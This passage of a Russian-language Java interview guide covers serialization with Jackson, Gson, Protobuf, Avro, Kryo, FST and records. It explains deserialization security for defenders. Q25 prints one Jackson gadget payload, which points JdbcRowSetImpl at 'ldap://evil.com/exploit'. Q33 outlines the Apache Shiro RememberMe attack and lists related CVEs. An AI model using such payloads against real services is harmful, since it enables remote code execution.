| Null handling | Гибкий (`@JsonInclude`) | `serializeNulls()` |

```java
// Jackson
ObjectMapper mapper = new ObjectMapper();
List<User> users = mapper.readValue(json, new TypeReference<List<User>>() {});

// Gson
Gson gson = new Gson();
List<User> users = gson.fromJson(json, new TypeToken<List<User>>() {}.getType());
```

**Когда выбрать `Gson`:** маленький проект без Spring, нужна простая JSON-сериализация, важен размер зависимости (мобильные приложения, Android).

**Когда выбрать `Jackson`:** Spring Boot проект, нужна работа с XML/YAML, полиморфизм, streaming API, высокая производительность.

## Q23. Как обрабатывать полиморфизм при JSON-сериализации в `Jackson`?

Полиморфная десериализация — ключевая задача, когда JSON содержит объекты разных подтипов. `Jackson` поддерживает несколько стратегий через `@JsonTypeInfo`.

```java
@JsonTypeInfo(
    use = JsonTypeInfo.Id.NAME,
    include = JsonTypeInfo.As.PROPERTY,
    property = "type"
)
@JsonSubTypes({
    @JsonSubTypes.Type(value = Circle.class, name = "circle"),
    @JsonSubTypes.Type(value = Rectangle.class, name = "rectangle")
})
public abstract class Shape {
    public abstract double area();
}

public class Circle extends Shape {
    public double radius;
    public double area() { return Math.PI * radius * radius; }
}

public class Rectangle extends Shape {
    public double width, height;
    public double area() { return width * height; }
}
```

Результат JSON:
```json
{"type": "circle", "radius": 5.0}
{"type": "rectangle", "width": 3.0, "height": 4.0}
```

Стратегии включения типа (`JsonTypeInfo.As`):
- `PROPERTY` — отдельное поле в JSON (`"type": "circle"`)
- `WRAPPER_OBJECT` — объект обёрнут: `{"circle": {"radius": 5}}`
- `WRAPPER_ARRAY` — массив: `["circle", {"radius": 5}]`
- `EXISTING_PROPERTY` — использовать существующее поле класса

## Q24. Как настроить кастомный сериализатор/десериализатор в `Jackson`?

Когда стандартных аннотаций недостаточно, `Jackson` позволяет создать полностью кастомную логику через `JsonSerializer`/`JsonDeserializer`.

```java
// Кастомный сериализатор
public class MoneySerializer extends JsonSerializer<Money> {
    @Override
    public void serialize(Money value, JsonGenerator gen,
                          SerializerProvider provider) throws IOException {
        gen.writeStartObject();
        gen.writeNumberField("amount", value.getAmount());
        gen.writeStringField("currency", value.getCurrency().getCurrencyCode());
        gen.writeEndObject();
    }
}

// Кастомный десериализатор
public class MoneyDeserializer extends JsonDeserializer<Money> {
    @Override
    public Money deserialize(JsonParser p, DeserializationContext ctx)
            throws IOException {
        JsonNode node = p.getCodec().readTree(p);
        BigDecimal amount = node.get("amount").decimalValue();
        String currency = node.get("currency").asText();
        return Money.of(amount, currency);
    }
}

// Регистрация
@JsonSerialize(using = MoneySerializer.class)
@JsonDeserialize(using = MoneyDeserializer.class)
public class Money { /* ... */ }

// Или через модуль
SimpleModule module = new SimpleModule();
module.addSerializer(Money.class, new MoneySerializer());
module.addDeserializer(Money.class, new MoneyDeserializer());
mapper.registerModule(module);
```

## Q25. Какие проблемы безопасности есть у JSON-десериализации?

Хотя JSON-десериализация значительно безопаснее Java Serialization, у неё тоже есть риски:

**1. Полиморфная десериализация в `Jackson`** — если включён `DefaultTyping` или `@JsonTypeInfo` с неограниченным `JsonTypeInfo.Id.CLASS`, атакующий может подставить в JSON произвольный класс:

```json
{"@class": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://evil.com/exploit"}
```

Поэтому в `Jackson` 2.10+ `DefaultTyping` отключён по умолчанию и добавлен `PolymorphicTypeValidator`:

```java
ObjectMapper mapper = JsonMapper.builder()
    .activateDefaultTyping(
        BasicPolymorphicTypeValidator.builder()
            .allowIfSubType("com.example.dto")
            .build(),
        DefaultTyping.NON_FINAL
    )
    .build();
```

**2. Denial of Service** — глубоко вложенный JSON может вызвать `StackOverflowError`. `Jackson` позволяет ограничить глубину: `mapper.getFactory().setStreamReadConstraints(...)`.

**3. Billion Laughs** (XML Entity Expansion) — актуально для XML-парсеров, но `Jackson` XML по умолчанию защищён.

## Q26. (!) Что такое `Protocol Buffers` и когда их использовать?

`Protocol Buffers` (`Protobuf`) — бинарный формат сериализации от Google со строгой схемой. Схема описывается в `.proto` файлах, из которых генерируется код для целевого языка.

```protobuf
syntax = "proto3";

message User {
  string name = 1;    // числовые теги, а не имена
  int32 age = 2;
  repeated string roles = 3;

  enum Status {
    ACTIVE = 0;
    INACTIVE = 1;
  }
  Status status = 4;
}
```

```java
// Сгенерированный код (автоматически)
User user = User.newBuilder()
    .setName("Alice")
    .setAge(30)
    .addRoles("admin")
    .setStatus(User.Status.ACTIVE)
    .build();

byte[] bytes = user.toByteArray();         // сериализация
User parsed = User.parseFrom(bytes);       // десериализация
```

| Характеристика | Protobuf | Java Serialization | JSON |
|----------------|----------|-------------------|------|
| Размер | Очень маленький | Большой | Средний |
| Скорость | Очень быстрая | Медленная | Средняя |
| Межъязыковость | Да (10+ языков) | Нет (только JVM) | Да |
| Человекочитаемость | Нет | Нет | Да |
| Схема | Обязательна (.proto) | Нет (класс = схема) | Опциональна (JSON Schema) |
| Эволюция | Отличная (backward/forward) | Плохая | Средняя |

Используется в [Kafka](../../messaging/kafka-interview.md), `gRPC`, внутренних API между микросервисами.

## Q27. Что такое `Apache Avro` и чем он отличается от `Protobuf`?

`Apache Avro` — бинарный формат сериализации, ориентированный на `Hadoop`-экосистему и потоковую обработку данных. Главное отличие от `Protobuf` — **схема хранится вместе с данными**.

```json
{
  "type": "record",
  "name": "User",
  "fields": [
    {"name": "name", "type": "string"},
    {"name": "age", "type": "int"},
    {"name": "email", "type": ["null", "string"], "default": null}
  ]
}
```

| Характеристика | Avro | Protobuf |
|----------------|------|----------|
| Схема | JSON, хранится с данными | `.proto`, нужна обоим сторонам |
| Кодогенерация | Опциональна (динамическая схема) | Обязательна |
| Эволюция схемы | Reader/Writer schema negotiation | Backward/Forward compatible |
| Экосистема | Hadoop, Kafka, Schema Registry | gRPC, Google Cloud |
| Размер сообщения | Компактный (без тегов полей) | Компактный (с тегами) |
| Лучший сценарий | Потоковая обработка, Data Lake | RPC, API между сервисами |

`Avro` особенно популярен в связке с `Confluent Schema Registry` и [Apache Kafka](../../messaging/kafka-interview.md) для эволюции схем событий.

## Q28. Что такое `Kryo` и когда его выбирают?

`Kryo` — быстрая бинарная библиотека сериализации для JVM. Не требует реализации `Serializable`, может сериализовать любой POJO.

```java
Kryo kryo = new Kryo();
kryo.register(User.class); // регистрация для компактности

// Запись
Output output = new Output(new FileOutputStream("data.kryo"));
kryo.writeObject(output, user);
output.close();

// Чтение
Input input = new Input(new FileInputStream("data.kryo"));
User user = kryo.readObject(input, User.class);
input.close();
```

**Преимущества:**
- Очень быстрая (в 5-10x быстрее Java Serialization)
- Компактный формат
- Не требует `Serializable`
- Используется в `Apache Spark`, `Flink`, `Akka`

**Ограничения:**
- Привязан к JVM (межъязыковая совместимость отсутствует)
- Не thread-safe (нужен `ThreadLocal<Kryo>` или пул)
- Нет явной схемы — эволюция классов может ломать совместимость
- Не подходит для внешних API и долговременного хранения

**Когда использовать:** внутренние коммуникации между JVM-процессами, кэширование, распределённые вычисления.

## Q29. (!) Как выбрать формат сериализации для проекта?

```mermaid
graph TD
    A[Какой формат?] --> B{Межъязыковой?}
    B -->|Да| C{Человекочитаемый?}
    B -->|Нет, только JVM| D{Максимальная скорость?}

    C -->|Да| E[JSON<br/>Jackson]
    C -->|Нет| F{Есть Schema Registry?}

    F -->|Да| G[Avro]
    F -->|Нет| H[Protobuf]

    D -->|Да| I[Kryo]
    D -->|Нет| J{Стандартный JDK?}

    J -->|Да| K[Java Serialization<br/>⚠️ с фильтрами]
    J -->|Нет| I

    style E fill:#c8e6c9
    style G fill:#c8e6c9
    style H fill:#c8e6c9
    style I fill:#c8e6c9
    style K fill:#fff9c4
```

| Критерий | JSON | Protobuf | Avro | Kryo | Java Ser. |
|----------|------|----------|------|------|-----------|
| REST API | ✅ | ❌ | ❌ | ❌ | ❌ |
| gRPC | ❌ | ✅ | ❌ | ❌ | ❌ |
| Kafka events | ⚠️ | ✅ | ✅ | ❌ | ❌ |
| Кэш (Redis) | ✅ | ✅ | ❌ | ✅ | ⚠️ |
| Spark/Flink | ❌ | ❌ | ✅ | ✅ | ❌ |
| RMI | ❌ | ❌ | ❌ | ❌ | ✅ |
| Отладка | ✅ | ❌ | ❌ | ❌ | ❌ |

## Q30. (!) Почему в микросервисах обычно избегают `Java Serialization`?

Стандартная `Java Serialization` создаёт ряд проблем в микросервисной архитектуре:

1. **Сильная связность** — сервисы должны иметь идентичные версии классов. При rolling deploy разные версии несовместимы.
2. **Привязка к JVM** — невозможно взаимодействовать с сервисами на `Python`, `Go`, `Node.js`
3. **Безопасность** — gadget chains делают приём данных извне крайне опасным
4. **Наблюдаемость** — бинарный формат нечитаем, нельзя залогировать или проинспектировать в инструментах мониторинга
5. **Производительность** — парадоксально, Java Serialization медленнее большинства альтернатив из-за рефлексии и метаданных
6. **Эволюция контрактов** — нет механизма версионирования схем, нет Schema Registry

```mermaid
graph LR
    A[Service A<br/>Java 17<br/>User v2] -->|Java Serialization<br/>❌ User v1 ≠ v2| B[Service B<br/>Java 11<br/>User v1]
    A -->|Protobuf/JSON<br/>✅ Совместимые схемы| B
    style A fill:#e1f5fe
    style B fill:#e1f5fe
```

В микросервисах используют: `JSON` (для REST API), `Protobuf` (для gRPC), `Avro` (для event streaming с [Kafka](../../messaging/kafka-interview.md)). Подробнее о сериализации в контексте обмена сообщениями: [Apache Kafka](../../messaging/kafka-interview.md).

## Q31. Как организовать версионирование схем в микросервисной архитектуре?

Версионирование схем — критически важная практика при эволюции API. Основные подходы:

**1. Protobuf — версионирование через правила совместимости:**
```protobuf
message User {
  string name = 1;
  int32 age = 2;
  // v2: добавлено новое поле (backward compatible)
  string email = 3;
  // НЕЛЬЗЯ: менять тип поля, переиспользовать удалённые номера
  reserved 5, 6;        // зарезервировать удалённые номера
  reserved "old_field"; // зарезервировать удалённые имена
}
```

**2. Avro + Schema Registry:**
```
Producer → Schema Registry → Consumer
   ↓            ↓               ↓
 Writer      Хранение        Reader
 Schema      + проверка       Schema
             совместимости
```

Режимы совместимости в Schema Registry:
- **BACKWARD** — новый код читает старые данные (добавление полей с default)
- **FORWARD** — старый код читает новые данные (удаление полей с default)
- **FULL** — оба направления
- **NONE** — без проверок (опасно)

**3. JSON — версионирование через URL или заголовки:**
```
GET /api/v1/users   → UserDto v1
GET /api/v2/users   → UserDto v2
Accept: application/vnd.api.v2+json
```

## Q32. Как сериализация связана с паттернами обмена сообщениями?

Формат сериализации влияет на архитектурные решения в messaging-системах:

**Event Sourcing** — события должны быть десериализуемы годы спустя. Здесь критична forward/backward совместимость. `Avro` с Schema Registry или `Protobuf` с reserved полями — лучший выбор.

**CQRS** — команды и запросы могут использовать разные форматы: `JSON` для REST-команд, `Protobuf` для внутренних событий.

**Saga Pattern** — компенсирующие транзакции требуют надёжной десериализации сообщений между сервисами. Несовместимость схем может привести к "зависшей" саге.

```mermaid
graph TB
    subgraph "Выбор формата по паттерну"
        A[REST API] -->|JSON| F[Human-readable]
        B[gRPC] -->|Protobuf| G[Типизированный контракт]
        C[Event Streaming] -->|Avro| H[Эволюция схем]
        D[Internal Cache] -->|Kryo| I[Максимальная скорость]
        E[Legacy RMI] -->|Java Ser.| J[⚠️ Миграция]
    end
    style J fill:#fff9c4
```

Подробнее о [паттернах обмена сообщениями в Kafka](../../messaging/kafka-interview.md) и [паттернах проектирования](../../design-patterns/design-patterns-interview.md).

## Q33. (!) Десериализация как вектор атаки — OWASP и реальные эксплойты

По классификации **OWASP Top 10 (A8:2017 — Insecure Deserialization)** ненадёжная десериализация входит в число критических уязвимостей. В OWASP Top 10 2021 вошла в A08:2021 — Software and Data Integrity Failures.

**Почему Java Serialization особенно опасна:**

1. JVM выполняет произвольный байт-код при десериализации (вызываются `readObject`, статические инициализаторы, конструкторы)
2. В classpath типичного enterprise-приложения (Spring, Hibernate) присутствуют **gadget-классы** с опасными `readObject`
3. Атакующему достаточно подменить сериализованный поток — без знания секретного ключа

**Реальные уязвимости:**

| CVE | Продукт | Эксплойт |
|-----|---------|---------|
| CVE-2015-4852 | Oracle WebLogic | Apache Commons Collections gadget chain — RCE |
| CVE-2016-0792 | Jenkins | RCE через сериализованный объект в API |
| CVE-2016-4437 | Apache Shiro | RememberMe cookie — Base64+шифрование+Java Ser. = RCE |
| CVE-2017-7525 | Jackson | `enableDefaultTyping` + `JdbcRowSetImpl` = SSRF/RCE |

**Apache Shiro — показательный пример:**

```
Атакующий
  → модифицирует RememberMe cookie (Base64 → AES-CBC → Java Serialization)
  → сервер десериализует без проверки
  → гаджет-цепочка Commons Collections выполняет произвольную команду
```

**Защита согласно OWASP:**
1. Не десериализовать данные из ненадёжных источников
2. Подписывать сериализованные данные (HMAC) — проверять до десериализации
3. `ObjectInputFilter` — белый список классов
4. Изолировать десериализацию в отдельном процессе с минимальными правами
5. Логировать все попытки десериализации (Java Flight Recorder, `java.io.serialization` event)
6. Удалять из classpath известные gadget-библиотеки старых версий

```java
// Проверка подписи ДО десериализации
byte[] data = receiveData();
byte[] signature = receiveSignature();

// Верифицировать HMAC-SHA256
if (!verifyHmac(data, signature, secretKey)) {
    throw new SecurityException("Invalid signature — possible tampering");
}

// Только после успешной проверки — десериализация с фильтром
try (var ois = new ObjectInputStream(new ByteArrayInputStream(data))) {
    ois.setObjectInputFilter(myAllowList);
    return (MyDto) ois.readObject();
}
```

## Q34. (!) Как `readResolve()` обеспечивает Singleton при десериализации?

Стандартная Java-сериализация **создаёт новый объект** при десериализации, обходя приватный конструктор. Это нарушает инвариант Singleton:

```java
// Сломанный Singleton
public class BrokenSingleton implements Serializable {
    private static final BrokenSingleton INSTANCE = new BrokenSingleton();
    private BrokenSingleton() {}
    public static BrokenSingleton getInstance() { return INSTANCE; }
}

// После сериализации/десериализации — два разных объекта!
BrokenSingleton s1 = BrokenSingleton.getInstance();
byte[] bytes = serialize(s1);
BrokenSingleton s2 = deserialize(bytes);
System.out.println(s1 == s2); // false! Singleton нарушен
```

**Решение — `readResolve()`:** метод вызывается JVM после десериализации и позволяет заменить только что созданный объект другим:

```java
public class Singleton implements Serializable {
    private static final long serialVersionUID = 1L;
    private static final Singleton INSTANCE = new Singleton();

    private Singleton() {}

    public static Singleton getInstance() { return INSTANCE; }

    // Вызывается ПОСЛЕ десериализации — возвращаем единственный экземпляр
    @java.io.Serial
    private Object readResolve() {
        return INSTANCE; // десериализованный объект будет собран GC
    }
}

// Теперь Singleton работает корректно
Singleton s1 = Singleton.getInstance();
Singleton s2 = deserialize(serialize(s1));
System.out.println(s1 == s2); // true!
```

**Аналог `writeReplace()`:** позволяет заменить объект перед сериализацией — используется в Serialization Proxy Pattern:

```java
private Object writeReplace() {
    return new SerializationProxy(this); // сериализуем прокси вместо себя
}
```

**Лучшая альтернатива для Singleton** — использовать `enum`:

```java
public enum EnumSingleton {
    INSTANCE;
    // enum гарантированно защищён от дублирования при десериализации!
}
```

JVM гарантирует, что `enum`-константы десериализуются в единственный экземпляр — без `readResolve()`.

## Q35. Что такое `serialPersistentFields` и когда его использовать?

`serialPersistentFields` — специальное поле, позволяющее явно задать список полей, участвующих в сериализации, и их типы — независимо от реальных полей класса:

```java
public class FlexibleClass implements Serializable {
    // Список сериализуемых "виртуальных" полей
    @java.io.Serial
    private static final ObjectStreamField[] serialPersistentFields = {
        new ObjectStreamField("name", String.class),
        new ObjectStreamField("age", int.class),
        new ObjectStreamField("email", String.class)
    };

    // Реальные поля могут отличаться!
    private String fullName;  // "name" в сериализованной форме
    private int yearsOld;     // "age" в сериализованной форме
    private String contactEmail;

    @java.io.Serial
    private void writeObject(ObjectOutputStream out) throws IOException {
        ObjectOutputStream.PutField fields = out.putFields();
        fields.put("name", fullName);
        fields.put("age", yearsOld);
        fields.put("email", contactEmail);
        out.writeFields();
    }

    @java.io.Serial
    private void readObject(ObjectInputStream in)
            throws IOException, ClassNotFoundException {
        ObjectInputStream.GetField fields = in.readFields();
        fullName = (String) fields.get("name", null);
        yearsOld = fields.get("age", 0);
        contactEmail = (String) fields.get("email", null);
    }
}
```

**Когда применять:**
- При рефакторинге полей класса без потери обратной совместимости (можно переименовать поля, не меняя сериализованный формат)
- Для маппинга между логическими именами формата и физическими именами полей
- При реализации строгого контракта сериализованной формы (защита от случайного изменения)

**Важно:** `serialPersistentFields` должно быть `private static final` с точно таким именем — иначе JVM игнорирует его.

## Q36. Как сериализация работает с наследованием и `abstract class`?

Java-сериализация и наследование — источник многих тонких проблем:

**1. Родительский класс `Serializable` — все подклассы тоже `Serializable`:**

```java
// Serializable распространяется на подклассы
public class Animal implements Serializable {
    private String name;
}

public class Dog extends Animal {
    private String breed;
    // Dog автоматически Serializable, breed тоже сериализуется
}
```

**2. Родительский класс НЕ `Serializable`:**

```java
public class Base { // не Serializable
    private int baseField = 42; // НЕ сериализуется
    // ОБЯЗАТЕЛЬНО нужен конструктор по умолчанию!
    public Base() { baseField = 0; } // вызовется при десериализации Child
}

public class Child extends Base implements Serializable {
    private int childField = 10; // сериализуется

    // При десериализации:
    // 1. Вызывается Base() — baseField = 0 (не восстанавливается из потока!)
    // 2. childField восстанавливается из потока = 10
}
```

**3. Abstract class и сериализация:**

```java
// Абстрактный класс может быть Serializable
public abstract class AbstractEntity implements Serializable {
    private static final long serialVersionUID = 1L;
    private Long id;

    // serialVersionUID определяется иерархией отдельно для каждого класса
}

public class UserEntity extends AbstractEntity {
    private static final long serialVersionUID = 2L; // свой UID!
    private String username;
}
```

**Правила для безопасной сериализации иерархий:**

| Ситуация | Что происходит | Что нужно |
|----------|----------------|-----------|
| Parent `Serializable`, Child нет | Child тоже сериализуется | Пометить нужные поля `transient` |
| Parent не `Serializable` | Поля Parent не сериализуются | Parent обязан иметь `public`/`protected` no-arg конструктор |
| Abstract class `Serializable` | Все конкретные подклассы сериализуются | Каждый класс должен иметь свой `serialVersionUID` |
| Интерфейс `Serializable` | Все реализации должны поддерживать сериализацию | Документировать контракт |

## Q37. (!) Как Spring обрабатывает сериализацию через `HttpMessageConverter`?

Spring MVC и Spring WebFlux используют `HttpMessageConverter` для преобразования объектов в HTTP-тело запроса/ответа и обратно. Это основной механизм сериализации в REST API.

```mermaid
graph LR
    A[Java Object] -->|write| B[HttpMessageConverter] -->|serialize| C[HTTP Body]
    C -->|deserialize| B -->|read| A
    style B fill:#c8e6c9
```

**Основные конвертеры:**

| Конвертер | Media Type | Описание |
|-----------|-----------|---------|
| `MappingJackson2HttpMessageConverter` | `application/json` | Jackson ObjectMapper (по умолчанию) |
| `GsonHttpMessageConverter` | `application/json` | Gson (нужно подключать) |
| `StringHttpMessageConverter` | `text/plain`, `text/*` | Строки без преобразования |
| `ByteArrayHttpMessageConverter` | `application/octet-stream` | Сырые байты |
| `MappingJackson2XmlHttpMessageConverter` | `application/xml` | Jackson XML |
| `ProtobufHttpMessageConverter` | `application/x-protobuf` | Protocol Buffers |
| `FormHttpMessageConverter` | `application/x-www-form-urlencoded` | HTML-формы |

**Настройка Jackson через Spring Boot:**

```java
@Configuration
public class JacksonConfig {

    @Bean
    public Jackson2ObjectMapperBuilderCustomizer customizer() {
        return builder -> builder
            .featuresToDisable(
                SerializationFeature.WRITE_DATES_AS_TIMESTAMPS,
                DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES
            )
            .featuresToEnable(MapperFeature.DEFAULT_VIEW_INCLUSION)
            .modules(new JavaTimeModule())
            .serializationInclusion(JsonInclude.Include.NON_NULL);
    }
}
```

**Content Negotiation — выбор конвертера по `Accept` заголовку:**

```java
@GetMapping(value = "/users/{id}", produces = {
    MediaType.APPLICATION_JSON_VALUE,
    MediaType.APPLICATION_XML_VALUE,
    "application/x-protobuf"
})
public UserDto getUser(@PathVariable Long id) {
    return userService.findById(id);
    // Spring выберет конвертер по Accept-заголовку клиента
}
```

**Кастомный `HttpMessageConverter`:**

```java
@Bean
public HttpMessageConverter<MyFormat> myConverter() {
    return new AbstractHttpMessageConverter<>(MediaType.parseMediaType("application/x-myformat")) {
        @Override
        protected boolean supports(Class<?> clazz) { return MyFormat.class.isAssignableFrom(clazz); }

        @Override
        protected MyFormat readInternal(Class<? extends MyFormat> clazz, HttpInputMessage msg) throws IOException {
            return MyFormat.parse(msg.getBody());
        }

        @Override
        protected void writeInternal(MyFormat t, HttpOutputMessage msg) throws IOException {
            t.writeTo(msg.getBody());
        }
    };
}
```

## Q38. (!) Jackson vs Gson — углублённое сравнение для Spring-проектов

Базовое сравнение уже в Q22. Здесь — детали, критичные для production Spring-проектов:

**Поддержка Java современных конструкций:**

```java
// Jackson 2.12+ — полная поддержка record
public record UserDto(String name, int age) {}

ObjectMapper mapper = new ObjectMapper();
String json = mapper.writeValueAsString(new UserDto("Alice", 30));
// {"name":"Alice","age":30}
UserDto user = mapper.readValue(json, UserDto.class);
// Работает через конструктор record

// Gson с record — ограничения
Gson gson = new Gson();
// До Gson 2.10 - не работал с record компонентами (использовал рефлексию полей)
// С Gson 2.10+ - базовая поддержка
```

**Производительность потоковой обработки:**

```java
// Jackson Streaming API — минимальный overhead
try (JsonParser parser = mapper.getFactory().createParser(json)) {
    while (parser.nextToken() != JsonToken.END_OBJECT) {
        String fieldName = parser.getCurrentName();
        // Обработка без создания промежуточных объектов
    }
}

// Gson не имеет аналогичного low-level API такой же мощности
```

**Обработка null и defaults:**

```java
// Jackson — гибкая настройка
@JsonInclude(JsonInclude.Include.NON_NULL)         // пропустить null
@JsonInclude(JsonInclude.Include.NON_EMPTY)         // пропустить null и пустые
@JsonInclude(JsonInclude.Include.NON_DEFAULT)       // пропустить значения по умолчанию

// Gson — глобально или через TypeAdapter
Gson gson = new GsonBuilder()
    .serializeNulls()   // включить сериализацию null (по умолчанию выключено)
    .create();
```

**Рекомендации для Spring Boot:**
- Используйте Jackson (уже в spring-boot-starter-web) — не нужно дополнительных зависимостей
- Gson — только если в команде сильная экспертиза или проект не использует Spring Boot
- Для Android — Gson предпочтительнее из-за меньшего размера

## Q39. FST — быстрый аналог Java Serialization

**FST** (Fast Serialization) — библиотека, совместимая с Java Serialization API, но значительно быстрее стандартной реализации.

```xml
<dependency>
    <groupId>de.ruedigermoeller</groupId>
    <artifactId>fst</artifactId>
    <version>2.57</version>
</dependency>
```

```java
// Использование FST
FSTConfiguration conf = FSTConfiguration.createDefaultConfiguration();
conf.registerClass(User.class); // опционально — ускоряет

// Сериализация
byte[] bytes = conf.asByteArray(user);

// Десериализация
User restored = (User) conf.asObject(bytes);
```

**Сравнение с Kryo и стандартной сериализацией:**

| Характеристика | Java Serialization | FST | Kryo |
|----------------|-------------------|-----|------|
| Требует `Serializable` | Да | Да (совместимость) | Нет |
| Скорость | 1x (baseline) | ~4-10x быстрее | ~5-10x быстрее |
| Размер | Большой | Меньше | Меньший |
| Thread-safe | Да | Конфигурация shared, экземпляры нет | Нет |
| Межъязыковость | Нет | Нет | Нет |
| Drop-in замена | — | Почти да | Нет |

**Преимущество FST перед Kryo:** обратная совместимость с `Serializable` — можно использовать как drop-in замену в legacy-коде без рефакторинга классов.

**Ограничения FST:**
- Привязан к JVM
- Библиотека менее активно развивается (последний релиз — 2021)
- Не подходит для межъязыковой коммуникации
- Нет официальной поддержки Java record и sealed classes

**Типичный use case:** кэширование объектов в Redis внутри JVM-приложения, где нужна скорость, но классы уже `Serializable`.

## Q40. Как сериализуются `Java Record` — детали механизма

Этот вопрос углубляет Q19. Здесь — детали внутреннего механизма и отличия от обычных классов.

**Специальный механизм сериализации record:**

При десериализации обычного класса JVM использует рефлексию для прямой записи в поля (обходя конструктор). Для `record` это невозможно (поля `final`), поэтому JVM использует специальный путь:

```
Обычный класс:   readObject → writeField(field1) → writeField(field2) → готово
Record:          readObject → вызвать канонический конструктор(arg1, arg2) → готово
```

**Это ключевое отличие:** валидация в каноническом конструкторе выполняется **при каждой десериализации**:

```java
public record PositiveRange(int min, int max) implements Serializable {
    public PositiveRange {
        if (min < 0 || max < 0) throw new IllegalArgumentException("negative!");
        if (min > max) throw new IllegalArgumentException("min > max");
    }
}

// При десериализации вредоносного потока с min=-1, max=5
// → будет выброшен IllegalArgumentException
// Для обычного класса — инвариант можно было бы нарушить!
```

**Аннотация `@java.io.Serial`** (Java 14+) — документирует и верифицирует методы сериализации:

```java
public record Config(String host, int port) implements Serializable {
    @java.io.Serial
    private static final long serialVersionUID = 1L;

    // @java.io.Serial на writeReplace — IDE/компилятор проверит корректность
    @java.io.Serial
    private Object writeReplace() {
        return new ConfigProxy(this);
    }
}
```

**Что недоступно для record при сериализации:**
- `writeObject`/`readObject` — игнорируются (но компилятор предупреждает)
- `readObjectNoData` — не применяется

**Что работает:**
- `writeReplace` / `readResolve` — полностью поддерживаются
- `serialVersionUID` — рекомендуется объявлять явно
- `ObjectInputFilter` — работает как обычно

**Record как Serialization Proxy «из коробки»:**

```java
// Это де-факто аналог Serialization Proxy Pattern
// Proxy и есть record-компоненты, канонический конструктор — это readResolve
public record Money(BigDecimal amount, Currency currency) implements Serializable {
    // Всё уже безопасно: canonical constructor = защищённая точка десериализации
}
```

---

## See also

- [Java IO / NIO](java-io-nio-interview.md) — `ObjectInputStream`/`ObjectOutputStream`, потоки байт и объекты
- [Java Core](java-core-interview.md) — контракт `equals`/`hashCode` и его роль при десериализации объектов
- [Java Exceptions](java-exceptions-interview.md) — `InvalidClassException`, `StreamCorruptedException` — типичные ошибки сериализации
- [ООП в Java](java-oop-interview.md) — `Serialization Proxy Pattern`, `readResolve()`, инварианты классов
- [Java Types](java-types-interview.md) — как `records` и `sealed classes` (Java 16-17) влияют на сериализацию
- [Java 17-21](java-17-21-interview.md) — сериализация `records` и `sealed classes` — новые подходы
- [Паттерны проектирования](../../design-patterns/design-patterns-interview.md) — `Serialization Proxy`, `Builder` для безопасной десериализации
- [Spring Framework](../../frameworks/spring/spring-framework-interview.md) — `@JsonIgnore`, `@JsonProperty`, Jackson-интеграция в Spring

- [Java 17-21](java-17-21-interview.md)
- [Java 8](java-8-interview.md)
- [Java Annotations](java-annotations-interview.md)
- [Java Collections](java-collections-interview.md)
- [Java Concurrency](java-concurrency-interview.md)
- [Java Conditional Statements](java-conditional-statements-interview.md)
